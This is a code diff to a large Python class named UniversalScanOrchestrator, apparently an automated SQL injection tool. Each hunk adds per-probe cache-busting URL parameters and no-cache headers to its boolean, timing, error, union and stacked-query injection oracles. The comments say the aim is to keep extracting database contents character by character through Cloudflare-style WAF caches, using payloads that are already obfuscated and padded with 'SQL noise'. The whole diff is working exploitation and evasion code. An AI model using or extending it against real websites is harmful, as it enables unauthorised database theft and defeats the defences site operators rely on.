@@ -118277,8 +118277,26 @@ class UniversalScanOrchestrator:
                                                     _pay = apply_heavy_variation(_pay, _rc[0], data_fmt=_df)
                                                     _pay = _obfuscate_extraction_cond(_pay, _rc[0])
                                                     _pay = apply_sql_noise(_pay, _rc[0])
+                                                    # BUG-IBO-CACHE-BUST FIX (HIGH, all 5 DBMSes, B/BH/IN/NV/WB/EX/HY
+                                                    # techniques, all surfaces, all HTTP methods):
+                                                    # _inline_bool_oracle sent every probe with the same URL (_u) and no
+                                                    # cache-busting. CDN/WAF decision caches keyed on URL signature return
+                                                    # the same cached verdict for every probe → oracle returns None for all
+                                                    # WAF-blocked probes → binary search converges to wrong value → garbage
+                                                    # chars on all WAF-protected targets. Fix: per-probe nonce + payload
+                                                    # hash suffix (same pattern as MSE._send_payload lines 54207-54211).
+                                                    _cb_ibo = random.randint(1000000, 9999999)
+                                                    _ch_ibo = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                    _cb_u_ibo = (_u + ("&" if "?" in _u else "?")
+                                                                 + _get_cache_bust_params(_cb_ibo, _ch_ibo))
+                                                    _cdn_hdrs_ibo = {
+                                                        "Cache-Control": "no-cache, no-store",
+                                                        "Pragma": "no-cache",
+                                                        "Accept-Language": f"en-US,en;q=0.{_cb_ibo % 9000 + 1000}",
+                                                    }
                                                     _fp_b = await asyncio.wait_for(
-                                                        _send_injected(_e, _m, _u, _d, _df, _p, _o + _pay, _tc),
+                                                        _send_injected(_e, _m, _cb_u_ibo, _d, _df, _p, _o + _pay, _tc,
+                                                                       extra_headers=_cdn_hdrs_ibo),
                                                         timeout=10)
                                                     if _fp_b is None:
                                                         return False
@@ -118477,9 +118495,31 @@ class UniversalScanOrchestrator:
                                                     _pay = _obfuscate_extraction_cond(_pay, _rc[0])
                                                     _pay = apply_sql_noise(_pay, _rc[0])
                                                     # (BUG-V39-BATCH FIX: `import time as _t_mod` removed — use module-level `time`)
+                                                    # BUG-ITO-CACHE-BUST FIX (CRITICAL, all 5 DBMSes, T/TH/HQ/BT techniques,
+                                                    # all surfaces, all HTTP methods):
+                                                    # _inline_timing_oracle sent every probe with the same URL (_u) and no
+                                                    # cache-busting parameters. CDN/WAF decision caches keyed on the request
+                                                    # URL signature return the same cached verdict (block/pass) for every
+                                                    # extraction probe. On Cloudflare (conf>0.90): blocked probes return
+                                                    # instantly (< threshold → False) → oracle biased False → binary search
+                                                    # converges to wrong length (e.g. 468) and garbage chars (]^¨¾1¥À?³).
+                                                    # Detection-phase probes bypass the cache via unique obfuscated payloads
+                                                    # but extraction probes are similar enough to hit the WAF decision cache.
+                                                    # Fix: per-probe nonce + payload hash suffix (same pattern as
+                                                    # MSE._send_payload at lines 54207-54211). CDN-bypass headers also added.
+                                                    _cb_ito = random.randint(1000000, 9999999)
+                                                    _ch_ito = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                    _cb_u_ito = (_u + ("&" if "?" in _u else "?")
+                                                                 + _get_cache_bust_params(_cb_ito, _ch_ito))
+                                                    _cdn_hdrs_ito = {
+                                                        "Cache-Control": "no-cache, no-store",
+                                                        "Pragma": "no-cache",
+                                                        "Accept-Language": f"en-US,en;q=0.{_cb_ito % 9000 + 1000}",
+                                                    }
                                                     _t0 = time.monotonic()
                                                     await asyncio.wait_for(
-                                                        _send_injected(_e, _m, _u, _d, _df, _p, _pay, _tc),
+                                                        _send_injected(_e, _m, _cb_u_ito, _d, _df, _p, _pay, _tc,
+                                                                       extra_headers=_cdn_hdrs_ito),
                                                         timeout=_ts * 3)
                                                     _elapsed_ms = (time.monotonic() - _t0) * 1000
                                                     # FIX-7A: Use 65% of expected sleep as threshold (was _ts*800ms=80%).
@@ -118596,9 +118636,20 @@ class UniversalScanOrchestrator:
                                                         _pay = apply_heavy_variation(_pay, _rc[0], data_fmt=_df)
                                                         _pay = _obfuscate_extraction_cond(_pay, _rc[0])
                                                         _pay = apply_sql_noise(_pay, _rc[0])
+                                                        # BUG-IEO-CACHE-BUST FIX (HIGH, E/EH techniques, all 5 DBMSes,
+                                                        # all surfaces): Same CDN/WAF decision cache issue as ITO/IBO fixes.
+                                                        _cb_ieo = random.randint(1000000, 9999999)
+                                                        _ch_ieo = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                        _cb_u_ieo = (_u + ("&" if "?" in _u else "?")
+                                                                     + _get_cache_bust_params(_cb_ieo, _ch_ieo))
+                                                        _cdn_hdrs_ieo = {
+                                                            "Cache-Control": "no-cache, no-store",
+                                                            "Pragma": "no-cache",
+                                                            "Accept-Language": f"en-US,en;q=0.{_cb_ieo % 9000 + 1000}",
+                                                        }
                                                         _fp_e = await asyncio.wait_for(
-                                                            _send_injected(_e, _m, _u, _d, _df, _p,
-                                                                _o + _pay, _tc), timeout=15)
+                                                            _send_injected(_e, _m, _cb_u_ieo, _d, _df, _p,
+                                                                _o + _pay, _tc, extra_headers=_cdn_hdrs_ieo), timeout=15)
                                                         if _fp_e:
                                                             return (_get_safe_status_code(_fp_e) >= 500 or
                                                                     _get_safe_status_code(_fp_e) != _bs)
@@ -118618,9 +118669,19 @@ class UniversalScanOrchestrator:
                                                             _pay_alt = apply_heavy_variation(_pay_alt, _rc[0], data_fmt=_df)
                                                             _pay_alt = _obfuscate_extraction_cond(_pay_alt, _rc[0])
                                                             _pay_alt = apply_sql_noise(_pay_alt, _rc[0])
+                                                            # BUG-IEO-CACHE-BUST FIX: alt-prefix path needs cache-busting too.
+                                                            _cb_ieo_a = random.randint(1000000, 9999999)
+                                                            _ch_ieo_a = hashlib.md5(_pay_alt.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                            _cb_u_ieo_a = (_u + ("&" if "?" in _u else "?")
+                                                                           + _get_cache_bust_params(_cb_ieo_a, _ch_ieo_a))
+                                                            _cdn_hdrs_ieo_a = {
+                                                                "Cache-Control": "no-cache, no-store",
+                                                                "Pragma": "no-cache",
+                                                                "Accept-Language": f"en-US,en;q=0.{_cb_ieo_a % 9000 + 1000}",
+                                                            }
                                                             _fp_alt = await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _u, _d, _df, _p,
-                                                                    _o + _pay_alt, _tc), timeout=15)
+                                                                _send_injected(_e, _m, _cb_u_ieo_a, _d, _df, _p,
+                                                                    _o + _pay_alt, _tc, extra_headers=_cdn_hdrs_ieo_a), timeout=15)
                                                             if _fp_alt:
                                                                 return (_get_safe_status_code(_fp_alt) >= 500 or
                                                                         _get_safe_status_code(_fp_alt) != _bs)
@@ -118710,8 +118771,19 @@ class UniversalScanOrchestrator:
                                                             _pay = apply_heavy_variation(_pay, _rc[0] + 1, data_fmt=_df)
                                                             _pay = _obfuscate_extraction_cond(_pay, _rc[0] + 1)
                                                             _pay = apply_sql_noise(_pay, _rc[0] + 1)
+                                                            # BUG-IUO-CACHE-BUST FIX (HIGH, U/UE techniques, all 5 DBMSes):
+                                                            _cb_iuo = random.randint(1000000, 9999999)
+                                                            _ch_iuo = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                            _cb_u_iuo = (_u + ("&" if "?" in _u else "?")
+                                                                         + _get_cache_bust_params(_cb_iuo, _ch_iuo))
+                                                            _cdn_hdrs_iuo = {
+                                                                "Cache-Control": "no-cache, no-store",
+                                                                "Pragma": "no-cache",
+                                                                "Accept-Language": f"en-US,en;q=0.{_cb_iuo % 9000 + 1000}",
+                                                            }
                                                             _fp_u = await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _u, _d, _df, _p, _o + _pay, _tc),
+                                                                _send_injected(_e, _m, _cb_u_iuo, _d, _df, _p, _o + _pay, _tc,
+                                                                               extra_headers=_cdn_hdrs_iuo),
                                                                 timeout=15)
                                                         else:
                                                             _pay = f"{_o}{_ipfx} AND ({_cond})-- -"
@@ -118722,8 +118794,19 @@ class UniversalScanOrchestrator:
                                                             _pay = apply_heavy_variation(_pay, _rc[0], data_fmt=_df)
                                                             _pay = _obfuscate_extraction_cond(_pay, _rc[0])
                                                             _pay = apply_sql_noise(_pay, _rc[0])
+                                                            # BUG-IUO-CACHE-BUST FIX: fallback path also needs cache-busting.
+                                                            _cb_iuo_fb = random.randint(1000000, 9999999)
+                                                            _ch_iuo_fb = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                            _cb_u_iuo_fb = (_u + ("&" if "?" in _u else "?")
+                                                                            + _get_cache_bust_params(_cb_iuo_fb, _ch_iuo_fb))
+                                                            _cdn_hdrs_iuo_fb = {
+                                                                "Cache-Control": "no-cache, no-store",
+                                                                "Pragma": "no-cache",
+                                                                "Accept-Language": f"en-US,en;q=0.{_cb_iuo_fb % 9000 + 1000}",
+                                                            }
                                                             _fp_u = await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _u, _d, _df, _p, _pay, _tc),
+                                                                _send_injected(_e, _m, _cb_u_iuo_fb, _d, _df, _p, _pay, _tc,
+                                                                               extra_headers=_cdn_hdrs_iuo_fb),
                                                                 timeout=15)
                                                         if _fp_u is None:
                                                             return False
@@ -118920,9 +119003,21 @@ class UniversalScanOrchestrator:
                                                         _pay = _obfuscate_extraction_cond(_pay, _rc[0])
                                                         _pay = apply_sql_noise(_pay, _rc[0])
                                                         # (BUG-V39-BATCH FIX: `import time as _t_s_mod` removed — use module-level `time`)
+                                                        # BUG-ISO-CACHE-BUST FIX (CRITICAL, S/DS techniques, all 5 DBMSes):
+                                                        # Same CDN/WAF decision cache issue as BUG-ITO-CACHE-BUST FIX.
+                                                        _cb_iso = random.randint(1000000, 9999999)
+                                                        _ch_iso = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                        _cb_u_iso = (_u + ("&" if "?" in _u else "?")
+                                                                     + _get_cache_bust_params(_cb_iso, _ch_iso))
+                                                        _cdn_hdrs_iso = {
+                                                            "Cache-Control": "no-cache, no-store",
+                                                            "Pragma": "no-cache",
+                                                            "Accept-Language": f"en-US,en;q=0.{_cb_iso % 9000 + 1000}",
+                                                        }
                                                         _t0_s = time.monotonic()
                                                         await asyncio.wait_for(
-                                                            _send_injected(_e, _m, _u, _d, _df, _p, _pay, _tc),
+                                                            _send_injected(_e, _m, _cb_u_iso, _d, _df, _p, _pay, _tc,
+                                                                           extra_headers=_cdn_hdrs_iso),
                                                             timeout=_ts * 3)
                                                         _el_s = (time.monotonic() - _t0_s) * 1000
                                                         # BUG-SQLITE-STACKED-THRESHOLD FIX (HIGH, SQLite,
@@ -119207,8 +119302,19 @@ class UniversalScanOrchestrator:
                                                             _pay = apply_heavy_variation(_pay, _rc[0], data_fmt=_df)
                                                             _pay = _obfuscate_extraction_cond(_pay, _rc[0])
                                                             _pay = apply_sql_noise(_pay, _rc[0])
+                                                            # BUG-IBWT-CACHE-BUST FIX (HIGH, WB/EX/HY/ST, template path):
+                                                            _cb_ibwt = random.randint(1000000, 9999999)
+                                                            _ch_ibwt = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                            _cb_u_ibwt = (_u + ("&" if "?" in _u else "?")
+                                                                          + _get_cache_bust_params(_cb_ibwt, _ch_ibwt))
+                                                            _cdn_hdrs_ibwt = {
+                                                                "Cache-Control": "no-cache, no-store",
+                                                                "Pragma": "no-cache",
+                                                                "Accept-Language": f"en-US,en;q=0.{_cb_ibwt % 9000 + 1000}",
+                                                            }
                                                             _fp_wb = await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _u, _d, _df, _p, _o + _pay, _tc),
+                                                                _send_injected(_e, _m, _cb_u_ibwt, _d, _df, _p, _o + _pay, _tc,
+                                                                               extra_headers=_cdn_hdrs_ibwt),
                                                                 timeout=10)
                                                         else:
                                                             _pay = f"{_o}{_ipfx} AND ({_cond})-- -"
@@ -119219,8 +119325,19 @@ class UniversalScanOrchestrator:
                                                             _pay = apply_heavy_variation(_pay, _rc[0], data_fmt=_df)
                                                             _pay = _obfuscate_extraction_cond(_pay, _rc[0])
                                                             _pay = apply_sql_noise(_pay, _rc[0])
+                                                            # BUG-IBWFB-CACHE-BUST FIX (HIGH, WB/EX/HY/ST, fallback path):
+                                                            _cb_ibwfb = random.randint(1000000, 9999999)
+                                                            _ch_ibwfb = hashlib.md5(_pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                            _cb_u_ibwfb = (_u + ("&" if "?" in _u else "?")
+                                                                           + _get_cache_bust_params(_cb_ibwfb, _ch_ibwfb))
+                                                            _cdn_hdrs_ibwfb = {
+                                                                "Cache-Control": "no-cache, no-store",
+                                                                "Pragma": "no-cache",
+                                                                "Accept-Language": f"en-US,en;q=0.{_cb_ibwfb % 9000 + 1000}",
+                                                            }
                                                             _fp_wb = await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _u, _d, _df, _p, _pay, _tc),
+                                                                _send_injected(_e, _m, _cb_u_ibwfb, _d, _df, _p, _pay, _tc,
+                                                                               extra_headers=_cdn_hdrs_ibwfb),
                                                                 timeout=10)
                                                         if _fp_wb is None:
                                                             return None  # network error -- indeterminate
